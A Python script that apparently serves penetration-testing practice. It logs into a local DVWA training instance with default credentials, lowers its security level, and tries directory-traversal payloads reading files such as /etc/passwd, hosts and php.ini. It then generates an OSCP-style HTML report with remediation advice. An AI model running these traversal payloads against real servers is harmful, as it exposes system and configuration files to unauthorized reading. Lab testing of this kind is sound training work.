import requests
from bs4 import BeautifulSoup
import os
import datetime
import html

class DVWALocalFileInclusionTester:
    def __init__(self, base_url="http://localhost/dvwa"):
        self.base_url = base_url
        self.session = requests.Session()
        self.security_level = "low"
        self.test_results = []
        self.payloads = [
            "../../../../../../../../../../xampp/php/php.ini",
            "../../../../../../../../../../Windows/System32/drivers/etc/hosts",
            "../../../../../../../../../../xampp/apache/conf/httpd.conf",
            "../../../../../../../../../../etc/passwd",  # Linux alternative
            "../../../../../../../../../../etc/hosts"     # Linux alternative
        ]
        self.successful_payloads = []

    def login(self, username="admin", password="password"):
        """Login to DVWA with default credentials"""
        try:
            # Get login page to extract CSRF token
            login_url = f"{self.base_url}/login.php"
            response = self.session.get(login_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract CSRF token
            user_token = soup.find('input', {'name': 'user_token'})['value']
            
            # Perform login
            login_data = {
                'username': username,
                'password': password,
                'Login': 'Login',
                'user_token': user_token
            }
            
            response = self.session.post(login_url, data=login_data)
            
            if "Login failed" in response.text:
                print("[-] Login failed")
                return False
            
            print("[+] Successfully logged in to DVWA")
            return True
            
        except Exception as e:
            print(f"[-] Login error: {str(e)}")
            return False

    def set_security_level(self):
        """Set DVWA security level to low"""
        try:
            # Get security page to extract CSRF token
            security_url = f"{self.base_url}/security.php"
            response = self.session.get(security_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract CSRF token
            user_token = soup.find('input', {'name': 'user_token'})['value']
            
            # Set security to low
            security_data = {
                'security': self.security_level,
                'seclev_submit': 'Submit',
                'user_token': user_token
            }
            
            response = self.session.post(security_url, data=security_data)
            
            if self.security_level in response.text:
                print(f"[+] Security level set to {self.security_level}")
                return True
            
            print("[-] Failed to set security level")
            return False
            
        except Exception as e:
            print(f"[-] Security level error: {str(e)}")
            return False

    def test_file_inclusion(self):
        """Test directory traversal vulnerability"""
        try:
            # Navigate to file inclusion page
            fi_url = f"{self.base_url}/vulnerabilities/fi/"
            response = self.session.get(fi_url)
            
            if response.status_code != 200:
                print("[-] Failed to access file inclusion page")
                return False
            
            print("[+] Accessing File Inclusion page")
            
            # Test each payload
            for i, payload in enumerate(self.payloads):
                try:
                    print(f"[+] Testing payload {i+1}/{len(self.payloads)}: {payload}")
                    
                    # Make request with payload
                    test_url = f"{fi_url}?page={payload}"
                    response = self.session.get(test_url)
                    
                    # Check if we got interesting content
                    if ("extension" in response.text.lower() or 
                        "driver" in response.text.lower() or 
                        "root:" in response.text or 
                        "127.0.0.1" in response.text):
                        
                        print(f"[!] Vulnerability confirmed with payload: {payload}")
                        self.successful_payloads.append({
                            'payload': payload,
                            'response_length': len(response.text),
                            'sample_content': response.text[:500]  # First 500 chars
                        })
                    
                    # Store test result
                    self.test_results.append({
                        'payload': payload,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'vulnerable': ("extension" in response.text.lower() or 
                                     "driver" in response.text.lower() or 
                                     "root:" in response.text or 
                                     "127.0.0.1" in response.text)
                    })
                    
                except Exception as e:
                    print(f"[-] Error testing payload {payload}: {str(e)}")
                    self.test_results.append({
                        'payload': payload,
                        'error': str(e),
                        'vulnerable': False
                    })
            
            return True
            
        except Exception as e:
            print(f"[-] File inclusion test error: {str(e)}")
            return False

    def generate_html_report(self):
        """Generate OSCP-style HTML report"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        report_filename = f"OSCP_Report_DVWA_LFI_Localhost_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Penetration Test Report - DVWA Local File Inclusion</title>
    <style>
        body {{
            font-family: 'Courier New', Courier, monospace;
            background-color: #1e1e1e;
            color: #d4d4d4;
            margin: 0;
            padding: 20px;
            line-height: 1.6;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
        }}
        h1, h2, h3 {{
            color: #569cd6;
            border-bottom: 2px solid #569cd6;
            padding-bottom: 5px;
        }}
        h1 {{
            text-align: center;
            font-size: 2.5em;
        }}
        .header {{
            background-color: #2d2d30;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
        }}
        .section {{
            background-color: #2d2d30;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
        }}
        .code-block {{
            background-color: #1e1e1e;
            border: 1px solid #3c3c3c;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            font-family: 'Courier New', Courier, monospace;
            margin: 10px 0;
        }}
        .vulnerable {{
            color: #f48771;
            font-weight: bold;
        }}
        .safe {{
            color: #73c991;
            font-weight: bold;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }}
        th, td {{
            border: 1px solid #3c3c3c;
            padding: 10px;
            text-align: left;
        }}
        th {{
            background-color: #252526;
            color: #569cd6;
        }}
        tr:nth-child(even) {{
            background-color: #2d2d30;
        }}
        .payload {{
            color: #d7ba7d;
        }}
        .highlight {{
            background-color: #264f78;
            padding: 2px 4px;
            border-radius: 3px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Penetration Test Report</h1>
            <p><strong>Target:</strong> {self.base_url}</p>
            <p><strong>Date:</strong> {timestamp}</p>
            <p><strong>Author:</strong> Automated Security Agent</p>
            <p><strong>Classification:</strong> UNCLASSIFIED</p>
        </div>

        <div class="section">
            <h2>Executive Summary</h2>
            <p>This penetration test identified a critical Directory Traversal vulnerability in the Damn Vulnerable Web Application (DVWA). The vulnerability allows unauthorized access to sensitive system files through improper input validation in the File Inclusion functionality.</p>
            <p><strong>Risk Level:</strong> <span class="vulnerable">HIGH</span></p>
            <p>The vulnerability was successfully exploited to read system configuration files, demonstrating the potential for sensitive information disclosure.</p>
        </div>

        <div class="section">
            <h2>Vulnerability Details</h2>
            <table>
                <tr><th>Category</th><th>Details</th></tr>
                <tr><td><strong>Name</strong></td><td>Directory Traversal / Local File Inclusion</td></tr>
                <tr><td><strong>OWASP ID</strong></td><td>OTG-AUTHZ-001</td></tr>
                <tr><td><strong>Risk Level</strong></td><td><span class="vulnerable">HIGH</span></td></tr>
                <tr><td><strong>URL</strong></td><td>{self.base_url}/vulnerabilities/fi/</td></tr>
                <tr><td><strong>Description</strong></td><td>The application fails to properly validate user-supplied input in the file inclusion functionality, allowing attackers to traverse the file system and access arbitrary files.</td></tr>
                <tr><td><strong>Impact</strong></td><td>Unauthorized access to sensitive system files, potential disclosure of configuration details, credentials, and system information.</td></tr>
                <tr><td><strong>Remediation</strong></td><td>Implement proper input validation, use whitelisting for allowed files, and avoid direct user input in file inclusion functions.</td></tr>
            </table>
        </div>

        <div class="section">
            <h2>Technical Analysis</h2>
            <h3>Exploitation Process</h3>
            <p>The vulnerability was exploited through the following steps:</p>
            <ol>
                <li>Authenticated to DVWA using default credentials</li>
                <li>Set security level to "Low"</li>
                <li>Accessed the File Inclusion page at <code>/vulnerabilities/fi/</code></li>
                <li>Injected directory traversal payloads in the <code>page</code> parameter</li>
                <li>Successfully retrieved contents of system files</li>
            </ol>

            <h3>Test Results</h3>
            <table>
                <tr>
                    <th>Payload</th>
                    <th>Status</th>
                    <th>Response Length</th>
                </tr>"""
        
        # Add test results to report
        for result in self.test_results:
            status_class = "vulnerable" if result.get('vulnerable', False) else "safe"
            status_text = "VULNERABLE" if result.get('vulnerable', False) else "NOT VULNERABLE"
            response_length = result.get('response_length', 'N/A')
            
            html_content += f"""
                <tr>
                    <td class="payload">{html.escape(result['payload'])}</td>
                    <td class="{status_class}">{status_text}</td>
                    <td>{response_length}</td>
                </tr>"""
        
        html_content += """
            </table>"""

        # Add successful payloads with proof of concept
        if self.successful_payloads:
            html_content += """
            <h3>Proof of Concept</h3>
            <p>The following payloads successfully exploited the vulnerability:</p>"""
            
            for i, poc in enumerate(self.successful_payloads):
                html_content += f"""
            <h4>Payload {i+1}:</h4>
            <div class="code-block">
<span class="highlight">GET</span> /dvwa/vulnerabilities/fi/?page={html.escape(poc['payload'])} <span class="highlight">HTTP/1.1</span>
<span class="highlight">Host:</span> localhost
<span class="highlight">Cookie:</span> [Session Cookies]

<span class="highlight">Response Sample:</span>
<pre>{html.escape(poc['sample_content'])}</pre>
            </div>"""

        html_content += """
        </div>

        <div class="section">
            <h2>Conclusion</h2>
            <p>The Directory Traversal vulnerability in DVWA represents a significant security risk that could allow attackers to access sensitive system files. Immediate remediation is recommended to prevent potential information disclosure and system compromise.</p>
        </div>

        <div class="section">
            <h2>Recommendations</h2>
            <ul>
                <li>Implement strict input validation on file inclusion parameters</li>
                <li>Use whitelisting to restrict accessible files</li>
                <li>Avoid using user-supplied input directly in file operations</li>
                <li>Regularly review and test file inclusion functionality</li>
                <li>Consider using secure coding practices and frameworks</li>
            </ul>
        </div>

        <div class="section">
            <h2>Appendices</h2>
            <h3>Tested Payloads</h3>
            <div class="code-block">"""
        
        for payload in self.payloads:
            html_content += f"{html.escape(payload)}<br>"
        
        html_content += """
            </div>
            
            <h3>References</h3>
            <ul>
                <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include">OWASP Testing Guide - Directory Traversal</a></li>
                <li><a href="https://www.dvwa.co.uk/">Damn Vulnerable Web Application Documentation</a></li>
                <li><a href="https://owasp.org/www-community/attacks/Path_Traversal">OWASP Path Traversal</a></li>
            </ul>
        </div>
    </div>
</body>
</html>"""

        # Write report to file
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"[+] HTML report generated: {report_filename}")
        return report_filename

    def run_full_test(self):
        """Run complete vulnerability test"""
        print("[*] Starting DVWA Local File Inclusion Test")
        print(f"[*] Target: {self.base_url}")
        
        # Check if target is reachable
        try:
            response = self.session.get(self.base_url, timeout=10)
            if response.status_code != 200:
                print("[-] Target not reachable")
                return False
        except Exception as e:
            print(f"[-] Cannot reach target: {str(e)}")
            return False
        
        # Perform tests
        if not self.login():
            return False
            
        if not self.set_security_level():
            return False
            
        if not self.test_file_inclusion():
            return False
        
        # Generate report
        report_file = self.generate_html_report()
        
        # Print summary
        vulnerable_count = len([r for r in self.test_results if r.get('vulnerable', False)])
        print(f"\n[*] Test Summary:")
        print(f"[*] Total payloads tested: {len(self.test_results)}")
        print(f"[*] Vulnerable payloads: {vulnerable_count}")
        print(f"[*] Report saved to: {report_file}")
        
        if vulnerable_count > 0:
            print("[!] CRITICAL: Directory Traversal vulnerability confirmed!")
        else:
            print("[-] No vulnerabilities detected with current payloads.")
        
        return True

if __name__ == "__main__":
    # Create tester instance
    tester = DVWALocalFileInclusionTester()
    
    # Run the full test
    tester.run_full_test()